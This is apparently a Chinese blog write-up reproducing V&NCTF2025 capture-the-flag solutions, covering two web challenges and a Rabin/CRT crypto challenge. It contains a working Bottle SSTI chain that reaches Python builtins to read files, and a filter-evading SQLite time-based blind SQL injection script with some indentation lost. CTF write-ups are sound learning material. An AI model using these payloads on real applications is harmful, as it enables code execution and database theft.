---
title: V&NCTF2025
date: 2025-02-16 21:02:32
tags: 复现
categories: 比赛复现
---

### Web

#### **学生姓名登记系统（ssti继承）**

题目提示说用了某个单文件框架，我们通过查找发现python本体的单文件框架是bottle

绕过长度限制，题目主页面也有提示“一行一个名字”，输入`{{7*7}}%0a{{8*8}}`会发现回显了 49 和 64

![image-20250216211727895](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502162117010.png)

同时，bottle 是使用的 SimpleTemplate 模板引擎，查阅文档了解到，这个模版里面可以使用任何 python 表达式，也就是运行执行任意单行 python 代码。

![image-20250216212003058](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502162120108.png)

我们可以尝试使用`{{print(5)}}`发现没有回显，但其实是在控制台输出了 5，这个语句成功执行了

接下来我们需要判断每一行之间的语句是否有关联

我们尝试

```
{{a:=5}}%0a{{a*a}}
```

成功打印5和25

![image-20250216212813081](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502162128129.png)

既然是上下文的关系，我们打个可以继承的ssti链（过滤了一些关键字）

```
name={{a:=''}}%0a{{b:=a.__class__}}%0a{{c:=b.__base__}}%0a{{d:=c.__subclasses__}}%0a{{e:=d()[156]}}%0a{{f:=e.__init__}}%0a{{g:=f.__globals__}}%0a{{z:='__builtins__'}}%0a{{h:=g[z]}}%0a{{i:=h['op''en']}}%0a{{x:=i("/flag")}}%0a{{y:=x.read()}}
```

得到flag

![image-20250216213801702](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502162138759.png)

#### **奶龙回家**

sqlite时间盲注，我们需要fuzz一下

过滤了

```
union = sleep bench 
```

参考文章

https://www.freebuf.com/articles/network/324785.html

我们用/**/代替空格，使用 randomblob 来进行延时

```
import requests
import time
url = 'http://node.vnteam.cn:46017/login'
flag = ''
for i in range(1,500):
low = 32
high = 128
mid = (low+high)//2
while(low<high):
 time.sleep(0.2)
 payload = "-
1'/**/or/**/(case/**/when(substr((select/**/hex(group_concat(usern
ame))/**/from/**/users),{0},1)>'{1}')/**/then/**/randomblob(500000
00)/**/else/**/0/**/end)/*".format(i,chr(mid))
 # payload = "-
1'/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))
/**/from/**/sqlite_master),{0},1)>'{1}')/**/then/**/randomblob(300
000000)/**/else/**/0/**/end)/*".format(i,chr(mid))
 datas = {
 "username":"123",
 "password": payload
 }
 # print(datas)
 start_time=time.time()
 res = requests.post(url=url,json=datas)
 end_time=time.time()
 spend_time=end_time-start_time
 if spend_time>=0.19:
 low = mid+1
 else:
 high = mid
 mid = (low+high)//2
if(mid ==32 or mid ==127):
 break
flag = flag+chr(mid)
print(flag)
print('\n'+bytes.fromhex(flag).decode('utf-8'))
```

### Crypto

#### **easymath**

解法一：

由于e较小，用中国剩余定理可以解

```py
from sympy import symbols, Eq, solve
from sympy.ntheory import isprime, sqrt_mod
from Crypto.Util.number import long_to_bytes

# 给定的参数
c = 24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944
sum_n = 15264966144147258587171776703005926730518438603688487721465
sum_n2 = 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923
prod_n = 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619

# 求解 n0, n1, n2
x, y, z = symbols('x y z')
eq1 = Eq(x + y + z, sum_n)
eq2 = Eq(x * y + x * z + y * z, sum_n2)
eq3 = Eq(x * y * z, prod_n)
solutions = solve((eq1, eq2, eq3), (x, y, z))
n_values = [int(sol) for sol in solutions[0]]

# 计算 N
N = n_values[0] * n_values[1] * n_values[2]
assert N == prod_n  # 验证计算正确

# 在每个模数上求平方根
roots = [sqrt_mod(c, p, all_roots=True) for p in n_values]

# 计算可能的 flag
from sympy.ntheory.modular import crt
possible_flags = []
for r0 in roots[0]:
    for r1 in roots[1]:
        for r2 in roots[2]:
            flag, _ = crt(n_values, [r0, r1, r2])
            possible_flags.append(flag)
print(roots)
# 找出正确的 flag
for flag in possible_flags:
    flag_bytes = long_to_bytes(flag)
    if b'VNCTF{' in flag_bytes:
        print("Recovered flag:", (flag_bytes))
        break
```

解法二：

已知e=2，我们用rabin 算法解

```py
from sympy import symbols, Eq, solve
from Crypto.Util.number import *
import itertools
x = symbols('x')
c = 
248842513136042751892595714590053743652047722702507255900146515191
253171343071603416581995516613333267035669964310674261386273321565
07267671028553934664652787411834581708944
polynomial = x**3 -
15264966144147258587171776703005926730518438603688487721465*x**2 + 
765132501806669481902549897037683382997233861546194687007300855860
57638716434556720233473454400881002065319569292923*x -
125440939526343949494022113552414275560444252378483072729156599143
746741258532431664938677330319449789665352104352620658550544887807
433866999963624320909981994018431526620619
n = solve(Eq(polynomial, 0), x)
N = 1
for p in n:
 N *= p
def crt(primes, remainders):
 result = 0
 for i in range(len(primes)):
 Mi = N // primes[i]
 inv = inverse(Mi, primes[i])
 result += remainders[i] * Mi * inv
 return result % N
roots = [pow(c, (int(p) + 1) // 4, int(p)) for p in n]
# 遍历所有可能的符号组合
for signs in itertools.product([1, -1], repeat=3):
 adjusted_roots = [
 signs[0] * roots[0] % n[0],
 signs[1] * roots[1] % n[1],
 signs[2] * roots[2] % n[2]
 ]
 flag = crt(n, adjusted_roots)
 print(long_to_bytes(flag))
```

